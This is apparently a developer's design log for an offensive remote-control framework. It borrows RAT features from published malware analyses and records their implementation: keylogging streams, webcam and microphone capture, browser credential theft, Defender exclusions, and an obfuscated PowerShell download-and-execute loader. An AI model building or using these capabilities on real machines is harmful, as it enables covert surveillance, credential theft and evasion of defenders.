# 瑞星 Ray Blog 远控能力调研与差距分析

> Source: <https://rayblog.rising.com.cn/> — 2026-11-16 抓取。博客共约 100 篇，绝大多数是
> 恶意样本家族分析（银狐、SideWinder、Patchwork、Lazarus、APT37、各类 Stealer/勒索软件）。
> 与"远控产品能力"直接相关的只有少数几篇，本文把它们的**功能面**提炼成一张对照表，并记录
> ForgeC2 已实现 / 未实现的部分，作为后续每轮"完善远控核心功能"的选择依据。

## 一手材料

| 文章 | 与本仓库的关系 |
|---|---|
| [银狐木马服务端探索及近期在野样本分析](https://rayblog.rising.com.cn/2025/01/银狐木马服务端探索及近期在野样本分析/)（2025-01-10） | **核心**：直接给出银狐（内部代号 WinOs）C2 服务端的 24 个主插件与自定义插件清单，是一份现成的远控功能基线 |
| [直捣蛇窝 – SideWinder 组织 C2 服务器揭秘](https://rayblog.rising.com.cn/2024/07/直捣蛇窝-sidewinder组织c2服务器揭秘/)（2024-07-09） | 被入侵的 C2/phishing 基础设施复盘（Sliver + xRAT、certutil 伪装证书、时区指纹）。对"面板功能"帮助有限，但对**基础设施卫生**有参考 |
| 仿冒 MetaTrader 投递银狐后门（2026-11-11） | 远控模块摘要："命令执行、屏幕捕获、键盘记录、剪贴板窃取" |
| PureRAT / HMCL 远控 / 多阶段远控后门（2026-09/07/06） | RAT 的投递与持久化链，功能面与银狐一致 |
| Warden Stealer（2026-10-27） | **剪贴板钱包地址替换** + 屏幕截图，说明剪贴板是远控/窃密的必争之地 |

## 银狐服务端功能基线 vs ForgeC2

| 银狐插件 | 能力 | ForgeC2 现状 | 结论 |
|---|---|---|---|
| 高速/差异/后台/前台窗口/娱乐屏幕 | 5 种屏幕监控模式 | WebRTC H.264 实时 + JPEG 快照轮询 + 监视器/多显示器 | **已具备**（模式数量较少，但覆盖核心） |
| 键盘记录 | 击键记录 | `keylogger_start/stop/dump` 任务（落盘缓冲），**无实时推送** | **缺口**：实时击键流 |
| 播放监听 / 语音监听 | 扬声器 / 麦克风监听 | `mic` 任务（录音文件），无实时音频 | 缺口（WebRTC 音频轨，工程量大） |
| 视频查看 | 摄像头 | `webcam` 任务 | 已具备（非实时） |
| 远程终端 | Shell | 交互式 shell + 任务执行 | 已具备 |
| 文件管理 | 文件浏览/上传/下载/执行 | 文件管理页 + 分块上传下载 | 已具备 |
| 查注册表 / 服务管理 / 系统管理 | 注册表、服务、进程、窗口 | 注册表、服务、进程、窗口任务 | 已具备 |
| 代理映射 | 系统代理配置 | 代理链 / SOCKS 转发 | 已具备（形态不同） |
| 急速搜索 | 全盘搜索 | `find` 任务 | 已具备 |
| 解密数据 | 浏览器密码/Cookie | `browser_steal` / `cookie_export` | 已具备 |
| 上线模块 / 客户生成 | 生成受控端（EXE/DLL/ShellCode，多 C2 地址，UPX/加密） | payload 生成器（多格式/多 profile/多 C2） | 已具备 |
| 远程交谈 | 与服务端文字对话 | **无** | **缺口（本轮实现）** |
| 注入管理 | 进程注入 | 注入任务 | 已具备 |
| 压力测试 | DDoS | — | 不做（超出产品范围） |
| 驱动插件 | Rootkit 隐藏 | — | 不做 |

## 本轮（2026-11-16）落地的两项

1. **远程交谈 / 消息弹窗**（银狐 `远程交谈.dll`）：`message` 信令 → 目标系统原生对话框
   （Windows `MessageBoxW`、Linux `zenity/kdialog/xmessage/notify-send`、macOS System Events），
   1024 字节上限、5 次/10 秒、仅审计长度；控制台显示"已弹出/未弹出"。
2. **实时击键流**（银狐 `键盘记录.dll` 的实时形态）：`keys` 信令开关 → Agent 复用
   `keylogger_start` 的采集循环，把新增击键按 800ms/4KiB 批量推到信令 socket；控制台有开关
   与实时面板。与任务路径共用同一把 `keylogActive` 锁：只有本会话启动的采集才会被本会话关闭，
   并且沿用 `AllowKeylogger` 的 opsec 配置；超出 4KiB 的积压只发送**最新**部分，`keylogger_dump`
   重置缓冲后游标自动归零。

随后一轮补齐了同一张表里的**独占控制**（银狐 `客户管理` 下的直接控制）：按 Agent 的 60 秒
控制租约，首个输入认领、每个事件续期、空闲自动释放；第二个操作员被 409/`input_rejected` 按名字
拒绝，显式 `take` 会审计并写明前持有者；控制台有"你/某人正在控制 + 接管"徽标。同时删除了 remote-desktop 的 frame 端点 ——
它的缓冲区在生产代码里从未被写入，只有测试自己塞值，属于"只在测试里成立"的接口。

## 摄像头直播（2026-11-16）

银狐功能表里的"视频查看"此前只有 `webcam` 任务（单张照片）。现在 `source=webcam` 复用同一条
WebRTC 视频轨：摄像头 → H.264 → RTP，缩放/编码/码率**与屏幕路径共用同一段参数**（`videoOutputArgs`）。

| 平台 | 采集输入 |
|---|---|
| Windows | `-f dshow -i video=<设备名>` |
| Linux | `-f v4l2 -i /dev/videoN` |
| macOS | `-f avfoundation -i <索引>:none` |

控制台通过 `video_devices` 信令拿到**设备名列表**（与 `audio_devices` 同一模式）：Windows 列表位置、
Linux `/dev/video*` 排序位置、macOS 的 AVFoundation 视频索引。列表在连接建立时与切换到摄像头时请求，
可手动刷新；请求限流 20 次/10 秒、按 `video_devices` 审计、中继帧上限 16 KiB。

摄像头模式是**只读**的：摄像头画面没有桌面可点，服务端对输入直接回
`input_rejected: remote input is disabled in camera mode`（不会转发给 Agent），控制台隐藏交互提示并显示
"摄像头画面仅可查看"。区域（瓦片）模式只支持屏幕，摄像头+region 在启动参数校验阶段就返回 400。

## 音频质量档位（2026-11-17）

直播音频从固定 32 kbps 扩展为三档，`audio_quality` 同时出现在启动参数与热切换信令里：

| 档位 | 码率 | Opus application | 实测 2 秒 |
|---|---|---|---|
| voice | 24 kbps | lowdelay | 98 包 / 5,403 B ≈ 21.6 kbps |
| standard（默认） | 32 kbps | lowdelay | 100 包 / 6,652 B ≈ 26.6 kbps |
| high | 64 kbps | audio | 100 包 / 11,913 B ≈ 47.7 kbps |

Opus 是 VBR，配置码率是上限；单声道与 20 ms 帧固定（改这两项需要重新协商 m-line）。
运行中切档只重启采集进程，Opus 轨道保持不变。

## 未做但值得排期的

银狐功能对照表里的核心模块（屏幕多模式、键盘记录、实时音频、远程交谈、文件/终端/注册表/服务/进程、
代理、搜索、浏览器数据、注入、生成）已全部覆盖。剩下的不是缺失模块，而是工程质量项：

- 设备列表已支持**名称下发**与 **30 秒 TTL 惰性刷新**（打开选择器时重新枚举），无需手动刷新。
- 音频已支持**质量档位**（voice/standard/high）；后续可加声道选择（需要重新协商 m-line）。

## macOS 扬声器回环（2026-11-16）

AVFoundation 的音频设备有独立编号，`-i ":N"` 中的 N 必须与 `ffmpeg -f avfoundation -list_devices`
音频段里方括号中的数字一致。

- 枚举：`ffmpeg -f avfoundation -list_devices true -i ""`，只取 `AVFoundation audio devices:` 段，
  索引取行内**最后一个**方括号数字（前缀里也有方括号）。
- 选择：`speaker` 只接受虚拟声卡（BlackHole/Soundflower/Loopback/"virtual audio"），没有则返回
  "安装 BlackHole 或改录麦克风"的明确错误；`mic` 用真实输入，枚举失败时回退到 `:0`。
- 采集：`ffmpeg -f avfoundation -i :<index>`；非数字索引直接拒绝，避免变成 ffmpeg 选项。
- 控制台：请求 `audio_devices` 拿到设备名列表（Windows dshow / Linux PulseAudio / macOS AVFoundation），
  下拉选择而不是猜索引，并带刷新按钮。

## Linux 扬声器回环（2026-11-16）

Windows 的 dshow 与 Linux 的 PulseAudio 走同一个策略函数：`speaker` 只接受回环设备，
没有回环设备时明确报错而不是"录房间"。

- 枚举：`pactl list short sources`，取第二列（source 名）；**只有 `.monitor` 结尾的 source 算回环**。
- 选择：`speaker` 在 monitor 列表里按 `audio_device` 索引；`mic` 在非 monitor 列表里选，
  列表为空（没有 pactl）时回退到 PulseAudio 的 `default`。
- 采集：`ffmpeg -f pulse -i <source>`，而不是固定 `-i default`。
- 回报：Agent 的 `audio` 确认帧带 `source`，操作员能看到实际录的是哪个 monitor。

## 实时音频的实测（2026-11-16）

链路：`ffmpeg -f dshow -i audio=<设备> -c:a libopus -b:a 32k -ar 48000 -ac 1
-application lowdelay -frame_duration 20 -f rtp rtp://127.0.0.1:<port>` → Agent 的 Opus 轨道。

本机麦克风实测 2 秒：**100 个 RTP 包 / 6,720 字节（约 27 kbps）**，与 20ms 帧率（50 包/秒）一致。
音频轨始终随会话协商，因此直播中开关音频无需重新协商；视频与音频是两个独立 ffmpeg 进程。

## 差异屏幕的实测（2026-11-16）

同一份 12 秒、1280×720@30、H.264 baseline 2.5 Mbps 的合成素材，比较
`scale/pad/format` 与 `mpdecimate,scale/pad/format + -fps_mode vfr`：

| 素材 | 基线帧/字节 | 差异模式帧/字节 | 变化 |
|---|---|---|---|
| 完全静止（仅背景） | 360 帧 / 77,602 B | **1 帧 / 4,927 B** | **-93.7%** |
| 每帧一个小方块移动 | 360 帧 / 107,032 B | **360 帧 / 106,904 B** | -0.1%（无丢帧） |

结论：`mpdecimate` 只丢弃与其前一帧几乎相同的画面，静止桌面从"整帧率"降到"一个关键帧"，
而真正变化的画面一帧不丢。对照组 `select='gt(scene,0.003)'` 在小块移动时只保留 3–6/360 帧，
会吞掉光标/输入框这类小变化，因此没有采用。

## 区域模式（tile diff）的实测（2026-11-16）

`mpdecimate` 解决的是"静止画面不占带宽"，但**每一帧变化仍要整帧编码**，而且依赖目标上有 ffmpeg。
`region` 模式是另一条路径：10 fps 抓屏 → 与上一帧逐瓦片比较 → 只对**变化比例 ≥ 0.2%** 的 64px 瓦片做
JPEG 编码，经**控制信令**发送（不建立媒体面），控制台用 `<canvas>` 累积绘制。

| 场景（合成 1280×720，120×40 方块移动） | 区域模式 | 整帧（10 fps） |
|---|---|---|
| 变化量 | 4 个瓦片 / tick | 1 整帧 / tick |
| 字节 | **4,224 B/tick ≈ 41 KiB/s** | 20,704 B/tick ≈ 202 KiB/s |
| 静止画面 | 首帧后 **0 字节** | 每 tick 一帧（除非再叠加 mpdecimate） |

结论：区域模式的带宽跟随**变化面积**，静止时为零，且**不依赖 ffmpeg**（TCP-only 目标可用）；
代价是画面质量为 JPEG（低于 H.264）、更新率固定 10 fps，且不传音频。两种模式都在工具栏上，
按链路质量与目标环境选择，而不是互相替代。

## 全量复审（2026-11-19，99/99 篇）

本轮通过 WordPress REST API 取回全部 99 篇全文（1.5 MB 纯文本语料），分为 1–25 / 26–50 /
51–75 / 76–99 四组独立阅读，并逐条与 227 个任务 spec、能力矩阵、插件白名单对照。
上一节的银狐功能表结论仍然成立；下表是新增的全量索引与取舍。

|#|日期|文章|与远控的关系|
|---|---|---|---|
|1|2026-11-11|仿冒 MetaTrader / Rust 银狐|RAT 基线 + 防火墙规则 + 内存模块加载；**Defender 排除项**|
|2|2026-11-05|PokerFace 无文件后门|RunPE 自注入、双互斥体、内存查询 Inline Hook 隐藏载荷|
|3|2026-10-27|explorer.exe 幽灵模块 / Warden Stealer|剪贴板钱包地址替换、截图、进程内存读取|
|4|2026-10-27|PHP/Node/nginx 漏洞预警|无（CVE）|
|5|2026-10-12|银狐新衣 / 公共云三阶段投递|RDTSC/CPU/交互三重反分析、runas 自提权、RIP 劫持注入|
|6|2026-10-08|cracx / ACRStealer|DoH 解析 + telegra.ph 死信箱回退；现有 resolver 已覆盖|
|7|2026-09-22|银狐 Rust 投递器 GPU 解密|D3D11 计算着色器解码 + GPU 基准环境门（不做：复杂度高、复用低）|
|8|2026-09-22|WP TaskScheduler / PureRAT|隐藏持久化、rasphone 预连接执行；TLS C2 基线|
|9|2026-09-20|Asruex 感染 Word/PDF/U 盘|蠕虫/文件感染，非远控产品需求|
|10|2026-08-14|Vidar 冒充外挂|窃密，浏览器/钱包数据；现有采集任务已覆盖|
|11|2026-08-11|仿冒瑞星官网银狐|投递基础设施，无新能力|
|12|2026-08-10|Atomic Stealer / macOS|假系统密码框、钱包替换、LaunchDaemon 持久化|
|13|2026-08-05|Remus Stealer / 白加黑|SSN 直接 syscall、链上 C2；resolver 已覆盖|
|14|2026-07-21|HMCL 仿冒 / ScreenConnect|LSA auth package 注册（近 rootkit 边界，不做）|
|15|2026-07-20|CVE-2026-14266|无（CVE）|
|16|2026-07-20|CVE-2026-14191|无（CVE）|
|17|2026-07-17|DoH 隧道里的银狐|DoH C2；DNS 传输 + DoH/DoT 已覆盖|
|18|2026-07-16|隐匿的"文函"银狐|**Defender 扫描排除项**、无文件注入、键鼠模拟、摄像头/音频|
|19|2026-07-13|ClickFix 纵深剖析|地域化载荷选择；工作窗/时区门控已有类似形态|
|20|2026-06-29|TransparentTribe / 印度陆军|Crimson RAT 基线 + 多端口回退|
|21|2026-06-18|银狐 LuaJIT 变种|Lua 脚本化攻击逻辑、TypeLib 劫持持久化（候选）|
|22|2026-06-15|智谱输入法供应链|投递链投毒，无新远控能力|
|23|2026-06-08|俄乌诱饵多阶段远控|UserInitMprLogonScript 持久化（候选）、HMAC 主机指纹|
|24|2026-06-02|CVE-2026-41089|无（CVE）|
|25|2026-05-25|JDownloader 供应链|DGA/DDR/Tor 三层回退；resolver + SOCKS 已覆盖|
|26|2026-04-17|银狐下载器环境感知|AV/窗口/闲置/应用存在性画像 → 差异化下发（大工程，排期）|
|27|2026-04-17|Nuitka 编译 Python 后门|编译期免杀，属于投递形态|
|28|2026-03-31|ClickFix / Amatera|WebDAV UNC 无落盘加载、硬件断点盲 ETW；已有同类 evasion|
|29|2026-03-31|成人游戏假冒安装包|浏览器扩展注入、BSC 合约回退 C2；resolver 已覆盖|
|30|2026-03-24|银狐自查手册|无（防御指南）|
|31|2026-03-20|虚假 OpenClaw 部署工具|Fiber 执行规避进程监控；投递形态|
|32|2026-03-12|GitHub 投毒鼠标连点器|受害者侧 TinyCC 编译、退出码状态机；投递形态|
|33|2026-01-28|银狐 FakeApp 2025 年报|BYOVD/PPL/CIP 攻防；已有 BYOVD 任务|
|34|2025-12-12|幽影劫持者|USB 蠕虫、WMI 事件心跳、DoH；resolver 已覆盖|
|35|2025-11-28|Optimizer 反检测|浏览器历史大小启发式反沙箱；已有 sandbox_detect|
|36|2025-10-31|PDFClick|用户文件静默外发；现有 exfil 任务已覆盖|
|37|2025-10-21|Steam 补丁 / StealC|**Defender 排除项**、App-Bound Encryption 解密|
|38|2025-09-12|银狐幽灵链|进程树断裂、**Defender 排除项**、RMM 凭据读取|
|39|2025-08-04|Patchwork 教育/土耳其|按命令注入原语；现有注入套件已覆盖|
|40|2025-07-14|蔓灵花中国政府|无落盘 C2、按受害者差异化下发|
|41|2025-07-03|Lazarus / EDGE|多步 HTTP C2 + 内存末段；基线|
|42|2025-06-30|银狐近期案例|硬件绑定密钥加密阶段载荷（大工程，排期）、事件日志擦除|
|43|2025-06-27|OceanLotus 中国|MSI TRANSFORMS 滥用、CFG 绕过；投递形态|
|44|2025-06-25|CVE-2025-6218|无（CVE）|
|45|2025-05-27|Flash 安装包伪装|**Defender 排除项**、回调式执行|
|46|2025-05-24|SideWinder 巴基斯坦|TCP C2 基线|
|47|2025-05-23|Bitter 巴基斯坦|IQY 初始访问、文件流命令；分块传输已覆盖|
|48|2025-05-09|APT37 韩国|Google Drive OAuth 死信箱（SaaS C2 候选）|
|49|2025-04-02|有效数签掩护|文件名哈希绑定 C2 URL（硬件/文件绑定候选）|
|50|2025-03-06|SideCopy 印度政府|函数转发 DLL 劫持、服务端切换反 VM|
|51|2025-01-10|银狐服务端探索|24 插件功能表（上一节基线）；通信密码、系统代理设置为 parity 项|
|52|2025-01-10|TargetCompany 勒索|无（勒索软件）|
|53|2024-10-21|Lazarus 加密行业|浏览器/钱包采集 + 剪贴板窗口标题；已覆盖|
|54|2024-09-29|黑神话悟空窃密|MaaS 分级日志规则；控制台形态，非 agent 能力|
|55|2024-08-15|CVE-2024-38063|无（CVE）|
|56|2024-08-15|Patchwork 科研教育|Donut + APC 执行；基线|
|57|2024-08-09|CVE-2024-38077|无（CVE）|
|58|2024-07-11|Patchwork 高校|NorthStarC2 命令集；基线|
|59|2024-07-11|SideWinder 国内|C2 域名对普通访问 302 到正常站点（监听器伪装候选）|
|60|2024-07-11|CVE-2024-38112|无（CVE）|
|61|2024-07-11|CVE-2024-30078|无（CVE）|
|62|2024-07-11|CVE-2024-6387|无（CVE）|
|63|2024-07-09|UAC-0050 白俄罗斯|已安装软件清单、音频播放、剪贴板清空（次要）|
|64|2024-07-09|TransparentTribe 女校|Crimson RAT 基线|
|65|2024-07-09|TransparentTribe 2021|时区/地理门控 + Startup 持久化；已覆盖|
|66|2024-07-09|TransparentTribe 2021|同上|
|67|2024-07-09|直捣蛇窝 SideWinder C2|SMTP 外发、假 PEM 载荷（certutil 格式候选）、基础设施卫生教训|
|68|2024-07-09|SideWinder 尼泊尔|命令幂等跳过（去重候选）|
|69|2024-07-09|SideCopy 国防|AV 分支侧加载、ReverseRAT 基线|
|70|2024-07-09|SideCopy 政府|空心跳自适应退避；现有 beacon 退避已覆盖|
|71|2024-07-09|Saaiwc 菲律宾|Telegram Bot API 作 C2（SaaS 死信箱候选）|
|72|2024-07-09|Patchwork 中国|Rust loader + AMSI/WLDP；已覆盖|
|73|2024-07-09|Patchwork 旁遮普|已安装产品清单 + 分块外发；已覆盖|
|74|2024-07-09|Patchwork 中国|命令/外发分离通道；现有多传输已覆盖|
|75|2024-07-09|海莲花仿 APT29|malleable 头部/cookie/jitter/spawnto；已覆盖|
|76|2024-07-09|海莲花 Google Installer|载荷密钥绑定受害者 IP；与 42 同族|
|77|2024-07-09|MuddyWater 变种|Telegram Bot C2 + 运行时换 token（SaaS 死信箱候选）|
|78|2024-07-09|Lazarus 军工|三回退 C2 URL + 分段载荷；已覆盖|
|79|2024-07-09|Lazarus 2021|AV 感知持久化分支；已覆盖|
|80|2024-07-09|Lazarus 中国|同上 + 短链 C2|
|81|2024-07-09|Kimsuky 韩国|xRAT 50 命令、连接关闭、反向代理；已覆盖|
|82|2024-07-09|Kasablanka 澳洲|WiFi 凭据、音频播放、光驱控制、zip/unzip（次要）|
|83|2024-07-09|BlindEagle 哥伦比亚|AsyncRAT `PreventSleep`（会话保活候选）|
|84|2024-07-09|BlackTech 企业|dwm.exe 持久化、HTTPS-on-80；基线|
|85|2024-07-09|蔓灵花军工|wmRAT 文件流分块；已覆盖|
|86|2024-07-09|APT37 中韩|pCloud/Yandex/Dropbox 云 C2 + 外发（SaaS 死信箱候选）|
|87|2024-07-09|APT37 韩国|日期 tick RC4 外发；无产品能力|
|88|2024-07-09|APT37 韩国|pCloud 主 + 云盘回退；与 86 同族|
|89|2024-07-09|APT29 仿冒|HTTP+DNS 混合 beacon + spawnto；已覆盖|
|90|2024-07-09|APT-C-23|简单 HTTP 双 C2；基线|
|91|2024-07-09|FormBook|深度反分析 + 下载解压（次要）|
|92|2024-07-09|RoadSweep 勒索|无（勒索软件）|
|93|2024-07-09|Mimic 勒索|无（勒索软件）|
|94|2024-07-09|Megazord 勒索|无（勒索软件）|
|95|2024-07-09|Manner 勒索|无（勒索软件）|
|96|2024-07-09|Enmity 勒索|无（勒索软件）|
|97|2024-07-09|BigHead 勒索|无（勒索软件；Telegram 外发与 77 同族）|
|98|2024-07-09|银狐新手法|注册表存 C2 三元组、MiniDump；已覆盖|
|99|2024-07-09|银狐最新手法|远程 C2/载荷切换、QQ 采集；已覆盖|

### 跨全量文章的缺口取舍

|缺口|文章|决定|
|---|---|---|
|Defender 扫描排除项（含可逆移除）|1/18/37/38/45|**本轮实现**：复现次数最多、成本最低的 OPSEC 缺口|
|会话保活（`PreventSleep`）|83|排期：小任务，但需要先定 WebRTC 会话自动挂钩的边界|
|TypeLib / `UserInitMprLogonScript` 持久化|21/23|排期：现有 `persistence_add` 加两个枚举值即可，需 Windows 实测|
|监听器伪装重定向|59|排期：需在 beacon 解密失败后跳转，先解决"不能当 oracle"的判定顺序|
|clipboard 自动替换|3/12|不做：跨入资金窃取形态，超出授权演练的克制边界|
|SaaS 死信箱 C2（Telegram/云盘）|48/71/77/86/88|排期：需外部账号与 ToS/token 生命周期，不能半成品上线|
|硬件/文件名绑定载荷解密|42/49/76|排期：payload 工厂大改，本地构建会触发 Defender，需专门环境|
|画像评分 + 条件下发|26/40/50|排期：策略引擎，先要有稳定的扩展主机属性缓存|
|certutil 假 PEM 载荷格式|67|不做：现有 stager/one-liner 已能承载，收益低于维护成本|
|GPU 解密、LSA auth package/rootkit、DDoS|7/14/33|不做：复杂度或与产品边界冲突|

## Windows PowerShell 上线投递优化（2026-11-19）

按"着重优化 Windows PowerShell 上线"的要求，先处理 one-liner/PS1 投递链，而不是动 v3 注册协议。
生成页原先给 PS1 的四种变体里，三个是 `IEX(New-Object Net.WebClient).DownloadString(url)`：
明文 URL + 两个高信号 token、无重试、无完整性校验；运营商选择的混淆档位只作用在"自包含 Base64"
那一种上，其余三种永远保持库存签名。

新增 **PS1 Verified Memory Load (obfuscated)**：内存下载 → 3 次短重试 → SHA-256 校验 →
只在匹配时用 `[ScriptBlock]::Create` 执行；不用 `IEX`、不落盘。整段 inner script 交给
`obfuscation.GenerateCommandLineOneLinerWithOptions` 包装，因此 URL 与摘要在 light(-enc) /
standard、heavy(XOR) 档位下也不出现在命令行里。

目标运行时纠正为 **PowerShell 7.7.0（`pwsh`）**：本机同时存在 5.1（`powershell.exe`），
原生成器会在 `powershell`/`PowerShell`/`POWERSHELL`/`pwsh` 四种写法中随机，无法稳定 targeting PS7。
现在 `PSObfuscateOptions.LauncherExe` 可显式钉住 `powershell` 或 `pwsh`；两个生成 handler 接受
`powershell_exe`（`powershell` / `pwsh` / `auto`，非法值 400）。生成页还固定提供
`PowerShell 7 (pwsh) Verified Memory Load` 变体，无需新增 UI 控件即可选择 PS7。

实测（本地 HTTP 服务分别打印 `PS1_DELIVERY_OK` / `PS7_DELIVERY_OK` 的无害脚本）：

|场景|运行时|结果|
|---|---|---|
|摘要正确，legacy launcher|5.1 / 7.7.0|均执行并输出标记|
|摘要错误|5.1 / 7.7.0|均静默、不执行|
|light / `-enc`|5.1 / 7.7.0|均执行成功|
|standard / XOR（经 `cmd.exe /c`）|5.1 / 7.7.0|均执行成功|
|heavy / XOR + 变量重命名 + 字符串切分（经 `cmd.exe /c`）|5.1 / 7.7.0|均执行成功|
|生成页的 pwsh 变体（heavy，经 `cmd.exe /c`）|7.7.0|执行成功|

`TestBuildOneLiners_PS1VerifiedMemoryLoader` 钉住变体数量、摘要小写化、无明文 URL/IEX、
`-enc` 形态、pwsh 变体前缀、`LauncherExe` 与 `powershell_exe` 白名单；探针脚本与本地服务
均为一次性验证，未留在仓库里。

控制台补齐了这两个后端选项：PS1 面板新增"单行命令混淆档位"（legacy/light/standard/heavy）与
"PowerShell 运行时"（auto / powershell 5.1 / pwsh 7+）两个下拉框，选择随 `/generate/ps1`
提交；此前这两个能力只能通过 API 使用，操作员在生成页看不到也选不了。

|验证|结果|
|---|---|
|`npx tsc --noEmit` / `eslint`|0 error（2 条既有 warning）|
|`BuildPanels.test.tsx`（含新增 PS1 面板用例）|6/6|
|前端语句覆盖率|40.29%（10454/25949），高于 39.5% 下限|
|bundle|公开 662 kB / 登录态 711 kB，均低于 675/720 kB 上限|
|webdist|LF 归一化后字节一致（438 文件）|

## 方法说明

- 文章枚举通过 WordPress REST API（`/wp-json/wp/v2/posts?per_page=100`）完成，避免抓 25 页列表。
- 只对与"远控能力"直接相关的文章逐段阅读；样本家族/勒索软件类文章仅用于功能面对照。
- 本文不复制样本哈希/IOC 之外的攻击代码，只保留"产品应该具备什么"的结论。
